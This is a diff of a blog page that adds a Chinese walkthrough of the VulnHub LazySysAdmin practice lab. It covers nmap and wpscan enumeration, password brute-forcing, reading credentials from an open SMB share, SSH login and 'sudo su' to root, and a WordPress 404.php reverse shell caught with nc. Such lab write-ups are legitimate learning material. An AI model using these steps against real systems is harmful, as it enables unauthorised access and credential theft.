@@ -7,7 +7,7 @@
 		
 
 <head>
-	<title>Archives: 2018/9</title>
+	<title>VulnHub-LazySysAdmin 过关笔记</title>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
@@ -49,10 +49,8 @@
 	
 	
 		
-			<p class="page-name"></p>
+			<p class="page-name">VulnHub-LazySysAdmin 过关笔记</p>
 		
-		
-			<p class="page-name">文章归档</p>
 		
 	
 </header>
@@ -98,57 +96,163 @@
 
 		<main>
 		<div class="page-container">
-		<!-- content srart -->
+		
+    <!-- content srart -->
 <div class="am-g am-g-fixed blog-fixed blog-content">
 	<div class="am-u-md-8 am-u-sm-12">
-		<div class="archive">
 
-			<div class="blog-text-center">
+		<article class="am-article blog-article-p">
+			<div class="am-article-hd">
 				
-					<i class="fa fa-book">总计2篇文章</i>
-				
-			</div>  
 
-			
 
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/09/17/2018.10.17/" itemprop="url">		
+			VulnHub-LazySysAdmin 过关笔记		
+		</a>
+	
+
+
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/09/17/2018.10.17/" itemprop="url">
+	<time datetime="2018-09-17T10:42:18.000Z" itemprop="datePublished">
+  		2018-09-17
+  </time>
+</a>    
+&nbsp
+					</span>
+					<span>						
+						
+							<i class="fa fa-tags"></i>
 							
-				
-				
-				
-					
+								<a href="#笔记" title="笔记" rel="2">笔记</a>&nbsp
+													 											
+						
+					</span>	
+				</p>
+			</div>	
 
-					
-					<!--<a href="/archives/2018" class="archive-year">2018</a>-->
-				
-								
-				
-					  
-					<div class="archive-year">
-						<a href="/archives/2018/09">
-							2018-09
-						</a>
-					</div>				
-				  
-				
-				<div class="archive-item">
-					<div class="archive-post-title">									
-						<a href="/2018/09/17/2018.10.17/" itemprop="url">VulnHub-LazySysAdmin 过关笔记</a>
-					</div>
-					<div class="archive-post-time">
-						<a href="/2018/09/17/2018.10.17/" itemprop="url">09-17</a>
-					</div>
-				</div>		        							
-			
-				
-			
+			<div class="am-article-bd">
+				<div class="content">
+					<p>这几天闲着无聊搭了个vulnhub的靶机来玩，在此把整个游戏的过程记录一下。<br>192.168.254.140是我的攻击机ip<br><img src="/post/9.27/1.png" alt="1"><br>首先，先探测主机ip<br>由于是处在同一网段</p>
+<p>‘’’c++ netdiscover -i wlo1’’’<br><img src="/post/9.27/2.png" alt="1"><br>ip可以确定是192.168.254.155<br>接下来nmap扫描靶机<br>​     nmap -T4 -A -v 192.168.254.155 -p 0-10000<br><img src="/post/9.27/3.png" alt="1"><br>root@kali:~# nmap -T4 -A -v 192.168.254.155 -p 0-10000<br><img src="/post/9.27/4.png" alt="1"><br><code>Starting Nmap 7.40 ( https://nmap.org ) at 2018-09-24 23:50 CST</code><br><code>NSE: Loaded 143 scripts for scanning.</code><br><code>NSE: Script Pre-scanning.</code><br><code>Initiating NSE at 23:50</code><br><code>Completed NSE at 23:50, 0.00s elapsed</code><br><code>Initiating NSE at 23:50</code><br><code>Completed NSE at 23:50, 0.00s elapsed</code><br><code>Initiating ARP Ping Scan at 23:50</code><br><code>Scanning 192.168.254.155 [1 port]</code><br><code>Completed ARP Ping Scan at 23:50, 0.00s elapsed (1 total hosts)</code><br><code>Initiating Parallel DNS resolution of 1 host. at 23:50</code><br><code>Completed Parallel DNS resolution of 1 host. at 23:50, 0.00s elapsed</code><br><code>Initiating SYN Stealth Scan at 23:50</code><br><code>Scanning 192.168.254.155 [10001 ports]</code><br><code>Discovered open port 3306/tcp on 192.168.254.155</code><br><code>Discovered open port 22/tcp on 192.168.254.155</code><br><code>Discovered open port 445/tcp on 192.168.254.155</code><br><code>Discovered open port 80/tcp on 192.168.254.155</code><br><code>Discovered open port 139/tcp on 192.168.254.155</code><br><code>Discovered open port 6667/tcp on 192.168.254.155</code><br><code>Completed SYN Stealth Scan at 23:50, 2.05s elapsed (10001 total ports)</code><br><code>Initiating Service scan at 23:50</code><br><code>Scanning 6 services on 192.168.254.155</code><br><code>Completed Service scan at 23:50, 11.03s elapsed (6 services on 1 host)</code><br><code>Initiating OS detection (try #1) against 192.168.254.155</code><br><code>NSE: Script scanning 192.168.254.155.</code><br><code>Initiating NSE at 23:50</code><br><code>Completed NSE at 23:51, 10.21s elapsed</code><br><code>Initiating NSE at 23:51</code><br><code>Completed NSE at 23:51, 0.00s elapsed</code><br><code>Nmap scan report for 192.168.254.155</code><br><code>Host is up (0.00096s latency).</code><br><code>Not shown: 9995 closed ports</code><br><code>PORT     STATE SERVICE     VERSION</code><br><code>22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</code><br><code>| ssh-hostkey:</code><br><code>|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)</code><br><code>|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)</code><br><code>|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)</code><br><code>80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</code><br><code>|_http-generator: Silex v2.2.7
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS</code><br><code>| http-robots.txt: 4 disallowed entries</code><br><code>|_/old/ /test/ /TR2/ /Backnode_files/
+|_http-server-header: Apache/2.4.7 (Ubuntu)</code><br><code>|_http-title: Backnode
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL (unauthorized)
+6667/tcp open  irc         InspIRCd
+| irc-info: 
+|   server: Admin.local
+|   users: 1.0
+|   servers: 1
+|   chans: 0
+|   lusers: 1
+|   lservers: 0
+|   source ident: nmap
+|   source host: 192.168.254.140
+|_  error: Closing link: (nmap@192.168.254.140) [Client exited]</code><br><code>MAC Address: 00:0C:29:AD:0C:D6 (VMware)</code><br><code>Device type: general purpose</code><br><code>Running: Linux 3.X|4.X</code><br><code>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</code><br><code>OS details: Linux 3.2 - 4.6</code><br><code>Uptime guess: 0.044 days (since Mon Sep 24 22:47:24 2018)</code><br><code>Network Distance: 1 hop</code><br><code>TCP Sequence Prediction: Difficulty=259 (Good luck!)</code><br><code>IP ID Sequence Generation: All zeros</code><br><code>Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p>
+<p><code>Host script results:</code><br><code>|_clock-skew: mean: -8h00m00s, deviation: 0s, median: -8h00m00s
+| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   LAZYSYSADMIN&lt;00&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   LAZYSYSADMIN&lt;03&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   LAZYSYSADMIN&lt;20&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</code><br><code>| smb-os-discovery:</code><br><code>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</code><br><code>|   Computer name: lazysysadmin</code><br><code>|   NetBIOS computer name: LAZYSYSADMIN\x00</code><br><code>|   Domain name: \x00</code><br><code>|   FQDN: lazysysadmin</code><br><code>|_  System time: 2018-09-24T17:50:55+10:00</code><br><code>| smb-security-mode:</code><br><code>|   account_used: guest</code><br><code>|   authentication_level: user</code><br><code>|   challenge_response: supported</code><br><code>|_  message_signing: disabled (dangerous, but default)</code><br><code>|_smbv2-enabled: Server supports SMBv2 protocol</code></p>
+<p><code>TRACEROUTE</code><br><code>HOP RTT     ADDRESS</code><br><code>1   0.96 ms 192.168.254.155</code></p>
+<p><code>NSE: Script Post-scanning.</code><br><code>Initiating NSE at 23:51</code><br><code>Completed NSE at 23:51, 0.00s elapsed</code><br><code>Initiating NSE at 23:51</code><br><code>Completed NSE at 23:51, 0.00s elapsed</code><br><code>Read data files from: /usr/bin/../share/nmap</code><br><code>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</code><br><code>Nmap done: 1 IP address (1 host up) scanned in 25.53 seconds</code><br>​           <code>Raw packets sent: 10076 (444.138KB) | Rcvd: 10016 (401.342KB)&#39;&#39;&#39;</code></p>
+<p>既然有开80端口，那就先从web入手<br><img src="/post/9.27/5.png" alt="1"><br>发现是个静态页面，那就爆破下目录路径<br>这里可以用kali的dirb工具来扫目录<br><img src="/post/9.27/6.png" alt="1"><br>手工发现有robots.txt<br><img src="/post/9.27/7.png" alt="1"><br>但是没什么有价值的东西<br>喝了杯茶后看了下扫描结果，发现有phpmyadmin和wordpress<br><img src="/post/9.27/8.png" alt="1"></p>
+<p>打开页面<a href="http://192.168.254.155/wordpress/" target="_blank" rel="noopener">http://192.168.254.155/wordpress/</a><br><img src="/post/9.27/9.png" alt="1"><br>wpscan -u <a href="http://192.168.254.155/wordpress" target="_blank" rel="noopener">http://192.168.254.155/wordpress</a> –enumerate u<br><img src="/post/9.27/10.png" alt="1"><br>从中可发现一个疑是用户名的字符串gie，可用来弱口令及爆破<br>既然有wordpress，那就上wpscan吧，扫描wordpress用户<br><img src="/post/9.27/11.png" alt="1"><br>得到admin用户名，尝试暴力破解<br>直接上burp让它在后台爆破跑着<br><img src="/post/9.27/12.png" alt="1"></p>
+<p>利用burp爆破的时间，继续搜集信息<br>enum4linux 192.168.254.155<br>用enum4linux 继续搜集目标信息<br><img src="/post/9.27/13.png" alt="1"><br>发现<br><img src="/post/9.27/14.png" alt="1"><br>好像共享文件里面有信息<br><img src="/post/9.27/15.png" alt="1"><br>root@kali:~# mount -t cifs -o username=’’,password=’’ //192.168.254.155/share$ /mnt<br>root@kali:~# cd /mnt/<br>root@kali:/mnt# ls<br>apache  Backnode_files  deets.txt  index.html  info.php  old  robots.txt  test  todolist.txt  wordpress  wp<br>cat查看deets.txt，顺利地发现了ssh密码<br>用上面得到的toggie作为用户名试试，那么直接ssh连<br><img src="/post/9.27/16.png" alt="1"><br>但是尴尬的发现连不上。。<br>后面重新试了次才发现原来用户是togie。。。上面输错了，汗。。<br><img src="/post/9.27/17.png" alt="1"><br>能连上去就好办了，先试试能不能直接切换到root用户<br>sudo su<br><img src="/post/9.27/18.png" alt="1"><br>到这里就已经成功得到root权限了。可以说到这里就通关了<br>但其实还有另外一种玩法，就是在上面的那个共享文件夹里还能找到一些有用的信息<br>比如在wordpress/wp-config.php中<br><img src="/post/9.27/19.png" alt="1"><br>配置文件里能发现mysql的账户密码<br>TogieMYSQL12345^^<br><img src="/post/9.27/20.png" alt="1"><br>但是没什么用，不够权限查询<br>直接拿这个账号密码继续登wp的控制面板<br><a href="http://192.168.254.155/wordpress/wp-login.php" target="_blank" rel="noopener">http://192.168.254.155/wordpress/wp-login.php</a><br><img src="/post/9.27/21.png" alt="1"><br>在appearance下的editor可以修改404.php，可以在404.php中插入反弹shell的代码<br>以此来反弹shell，如图<br><img src="/post/9.27/22.png" alt="1"><br><code>root@kali:~# nc -vlp 1234</code><br><code>listening on [any] 1234 ...</code><br><code>192.168.254.155: inverse host lookup failed: Unknown host</code><br><code>connect to [192.168.254.157] from (UNKNOWN) [192.168.254.155] 50098</code><br><code>Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</code><br><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<p><code>ifconfig</code><br><code>eth0      Link encap:Ethernet  HWaddr 00:0c:29:ad:0c:d6  
+​          inet addr:192.168.254.155  Bcast:192.168.254.255  Mask:255.255.255.0</code><br><code>​          inet6 addr: fe80::20c:29ff:fead:cd6/64 Scope:Link</code><br><code>​          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</code><br><code>​          RX packets:1657710 errors:5 dropped:7 overruns:0 frame:0</code><br><code>​          TX packets:1177800 errors:0 dropped:0 overruns:0 carrier:0</code><br><code>​          collisions:0 txqueuelen:1000</code><br><code>​          RX bytes:220865619 (220.8 MB)  TX bytes:436633216 (436.6 MB)</code><br><code>​          Interrupt:19 Base address:0x2000</code> </p>
+<p><code>lo        Link encap:Local Loopback  
+​          inet addr:127.0.0.1  Mask:255.0.0.0</code><br>​          <code>inet6 addr: ::1/128 Scope:Host</code><br>​          <code>UP LOOPBACK RUNNING  MTU:65536  Metric:1</code><br>​          <code>RX packets:439 errors:0 dropped:0 overruns:0 frame:0</code><br>​          <code>TX packets:439 errors:0 dropped:0 overruns:0 carrier:0</code><br>​          <code>collisions:0 txqueuelen:1</code><br>​          <code>RX bytes:40524 (40.5 KB)  TX bytes:40524 (40.5 KB)</code></p>
+<p>whoami<br>www-data<br><img src="/post/9.27/23.png" alt="1"><br>sudo do试下<br><img src="/post/9.27/24.png" alt="1"><br>出现了sudo: no tty present and no askpass program specified<br>这是因为www-data该帐号没有开启免密码导致的，然后往下就是提权了，提权后也就过关了。<br>这篇笔记就先到这里吧，后面再系统地学习linux提权思路再做比较系统些的笔记。</p>
 
+				</div>
+			</div>
+
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2018/10/28/2018.10.27/" title="SQL注入学习笔记">
+      		&laquo;上一篇 
+		</a>
+		</li>
+	
+	
+ </ul>
         
-  
-  
 
-		</div>
-	</div>
+			
+
+
+	</div> 
 </div>
+
+<!-- code highlight 测试版fix me-->
+<style>
+pre {
+  background: inherit;
+  border: 1px solid #ccc;
+  overflow-x: auto;
+  padding: .5em;
+  position: relative;
+  margin: 0 0 0.8em 0;
+  overflow-y: hidden
+}
+
+pre code {
+  margin: -0.5em !important;
+  padding: 0.5em !important;
+  overflow-y: auto;
+  overflow-x: auto;
+  display: block
+}
+
+code.has-numbering {
+  margin-left: 1.7em !important;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 2.2em;
+  height: 100%;
+  padding: 0.5em 0.2em 0.5em 0;
+  border-right: 1px solid #C3CCD0;
+  background-color: #EEE;
+  text-align: right;
+  color: #AAA;
+  list-style: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none
+}
+</style>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+
+<!-- css爬取自网页 -->
+<!-- code highlight 测试版fix me-->
+
 
 		</div>
 		<footer>
@@ -215,6 +319,11 @@
 	}
 </style>
 
+
+	<script src="/js/motto.js"></script>
+	<script>
+		$(".motto").html(getMingYanContent());
+	</script>	
 
 
 
